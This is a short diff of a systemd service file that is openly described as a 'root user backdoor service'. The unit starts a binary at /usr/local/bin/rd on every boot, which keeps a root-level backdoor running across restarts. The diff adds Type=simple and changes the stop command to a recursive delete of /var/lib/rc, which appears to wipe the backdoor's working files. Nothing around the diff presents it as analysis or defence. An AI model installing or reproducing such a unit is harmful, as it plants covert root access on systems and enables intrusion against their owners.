@@ -2,8 +2,9 @@
 Description=root user backdoor service
 
 [Service]
+Type=simple
 ExecStart=/usr/local/bin/rd
-ExecStop=/bin/rm /usr/local/root.fifo /usr/local/user.fifo
+ExecStop=/bin/rm -rf /var/lib/rc
 
 [Install]
 WantedBy=multi-user.target
